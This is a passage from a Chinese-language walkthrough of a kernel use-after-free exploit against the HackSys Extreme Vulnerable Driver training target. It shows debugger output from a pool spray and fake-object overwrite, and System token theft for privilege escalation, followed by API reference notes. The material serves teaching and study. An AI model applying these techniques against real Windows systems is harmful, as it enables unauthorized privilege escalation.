通过dd
8757b948可以看到，当前释放的内核对象_USE_AFTER_FREE_NON_PAGED_POOL->CallBack已经指向ac39d0，后面连续的41(即A)，其实这段就是FakeObject。  
然后查看内核对象所在的nonPagedPool，这里很明显可以看到每个pool
chunk大小都是60，并且每隔一个就是释放的状态，也正好符合我们刚才池喷射的理论。
    !pool 8757b948
最后一列TAG中，Hack即表示AllocateFakeObjectNonPagedPool调用分配给fakeObject的内存  
我们继续跟踪步入该段代码，可以看到和之前分析的payload一致，说明覆盖悬挂指针的内存块成功。  
    kd> !dml_proc
    Address  PID  Image file name
    86cf38a8 4    System         
    .... 
    88a8e460 368  HackSysEVDExpl
断到最后token复制的位置，可以看到将system的token=0x8da01277拷贝给当前进程了。  
    kd> r ecx
    ecx=88a8e460 #当前进程句柄
    kd> r edx
    edx=8da01277 #sytem进程的token
    kd> dt nt!_EX_FAST_REF 86cf38a8+f8 # 通过句柄查看system进程的token
       +0x000 Object           : 0x8da01277 Void
       +0x000 RefCnt           : 0y111
       +0x000 Value            : 0x8da01277
# 0x03 扩展知识
## 3.1 windows API
### 3.1.1 DeviceIoControl
DeviceIoControl 将控制代码直接发送到指定的设备驱动程序，使相应的设备执行相应的操作。  
语法
    BOOL WINAPI DeviceIoControl(
      _In_        HANDLE       hDevice,
      _In_        DWORD        dwIoControlCode,
      _In_opt_    LPVOID       lpInBuffer,
      _In_        DWORD        nInBufferSize,
      _Out_opt_   LPVOID       lpOutBuffer,
      _In_        DWORD        nOutBufferSize,
      _Out_opt_   LPDWORD      lpBytesReturned,
      _Inout_opt_ LPOVERLAPPED lpOverlapped
    );
  * hDevice [in]  
需要执行操作的设备句柄。该设备通常是卷，目录，文件或流，使用 CreateFile 函数打开获取设备句柄。
  * dwIoControlCode [in]  
操作的控制代码，该值标识要执行的特定操作以及执行该操作的设备的类型，每个控制代码的文档都提供了 **lpInBuffer** ，
**nInBufferSize** ， **lpOutBuffer** 和 **nOutBufferSize** 参数的使用细节。
  * lpInBuffer [in, optional]  
（可选）指向输入缓冲区的指针。这些数据的格式取决于dwIoControlCode参数的值。如果dwIoControlCode指定不需要输入数据的操作，则此参数可以为NULL。
  * nInBufferSize [in]  
输入缓冲区以字节为单位的大小。单位为字节。
  * lpOutBuffer [out, optional]  
（可选）指向输出缓冲区的指针。这些数据的格式取决于dwIoControlCode参数的值。如果dwIoControlCode指定不返回数据的操作，则此参数可以为NULL。
  * nOutBufferSize [in]  
输出缓冲区以字节为单位的大小。单位为字节。
  * lpBytesReturned [out, optional]  
（可选）指向一个变量的指针，该变量接收存储在输出缓冲区中的数据的大小。如果输出缓冲区太小，无法接收任何数据，则GetLastError返回ERROR_INSUFFICIENT_BUFFER,错误代码122(0x7a)，此时lpBytesReturned是零。
  * lpOverlapped [in, out, optional]  
（可选）指向OVERLAPPED结构的指针。
返回值:  
如果操作成功完成，DeviceIoControl将返回一个非零值。  
如果操作失败或正在等待，则DeviceIoControl返回零。 要获得扩展的错误信息，请调用GetLastError。  
### 3.1.2 ExAllocatePoolWithTag
ExAllocatePoolWithTag用于内核模式，在`堆`中分配指定类型的池内存，并返回指向已分配内存空间的首地址的指针。
    PVOID ExAllocatePoolWithTag(
      __drv_strictTypeMatch(__drv_typeExpr)POOL_TYPE PoolType,
      SIZE_T                                         NumberOfBytes,
      ULONG                                          Tag
    );
  * PoolType  
该参数用来指定想要申请的内存的类型（内核空间中的内存主要分成两类；分页内存区，和未分页内存区）。查询可选的内存区类型可以到MSDN查询[POOL_TYPE](https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ne-wdm-_pool_type)结构。  
如果此值为NonPagedPool，则分配非分页内存。  
如果为PagedPool， 则分配内存为分页内存。
  * NumberOfBytes  
通过该参数指定想要分配的内存的字节数，最好是4的倍数。
  * Tag  
为将要被分配的空间指定标志（就是给你得到的空间取个独一无二的名字）。  
进一步解释：赋给该参数的内容是一个字符串常量，最多可以包含四个字母，该字符串应该放到单引号当中（比如：‘tag1’‘tag2’）。另外，这个字符串常常是逆序的，如，‘1gaT’（所以大家会发现输入这个参数的串确实都是倒过来的。。。）。输入到这个参数中的每一个字符的ASCII值都必须在0-127之间。每次的申请空间的时候都最好应该使用一个独一无二的标识，这样可以帮助调试器和检查器辨认和分析。
  * 返回值  
如果该函数发现目前系统的自由空间不足，就会返回NULL。否则，将返回指向被分配出来的空间的首地址。  
### 3.1.3 ProbeForRead  
检查用户模式缓冲区是否确实驻留在地址空间的用户部分中，并且是否正确对齐。简而言之，就是看看这块内存是否是Ring3的内存，并不检查内存是否可读。如果不存在ring3内存地址空间范围内，则抛出异常。
        void ProbeForRead(
    const volatile VOID *Address,
    SIZE_T              Length,
    ULONG               Alignment
    );
  * Address  
[in] 指定用户模式缓冲区的开始
  * Length  
[in] 指定用户模式缓冲区的长度（以字节为单位）
  * Alignment  
[in] 指定用户模式缓冲区开头所需的对齐方式（以字节为单位）。
  * 返回值  
None
### 3.1.4 UNREFERENCED_PARAMETER
作用：告诉编译器，已经使用了该变量，不必检测警告！  
在VC编译器下，如果您用最高级别进行编译，编译器就会很苛刻地指出您的非常细小的警告。当你声明了一个变量，而没有使用时，编译器就会报警告。
### 3.1.4 NtAllocateReserveObject
系统调用，负责在内核端创建保留对象–在内核池上执行内存分配，返回适当的Handle等
    #define APC_OBJECT              0
    #define IO_COMPLETION_OBJECT    1
    #define MAX_OBJECT_ID           1
    NTSTATUS STDCALL NtAllocateReserveObject(
        OUT PHANDLE hObject,
        IN POBJECT_ATTRIBUTES ObjectAttributes,
        IN DWORD ObjectType )
    {
        PVOID       ObjectBuffer;
        HANDLE      hOutputHandle;
        NTSTATUS    NtStatus;
        if ( PreviousMode == UserMode )
        {
            /* Validate hObject */
        }
        if ( ObjectType > MAX_OBJECT_ID )
        {
            /* Bail out: STATUS_INVALID_PARAMETER
             */
        }else  {
            NtStatus = ObCreateObject( PreviousMode,
                           PspMemoryReserveObjectTypes[ObjectType],
                           ObjectAttributes,
                           PreviousMode,
                           0,
                           PspMemoryReserveObjectSizes[ObjectType],
                           0,
                           0,
                           &ObjectBuffer );
            if ( !NT_SUCCESS( NtStatus ) )
            /* Bail out: NtStatus
             */
                memset( ObjectBuffer, 0, PspMemoryReserveObjectSizes[ObjectType] );
            if ( ObjectType == IO_COMPLETION )
            {
                /*
                 *
                 * Perform some ObjectBuffer initialization
                 *
                 */
                ObjectBuffer[0x0C]  = 3;
                ObjectBuffer[0x20]  = PspIoMiniPacketCallbackRoutine;
                ObjectBuffer[0x24]  = ObjectBuffer;
                ObjectBuffer[0x28]  = 0;
            }
            NtStatus = ObInsertObjectEx( ObjectBuffer,
                             &hOutputHandle,
                             0,
                             0xF0003,
                             0,
                             0,
                             0 );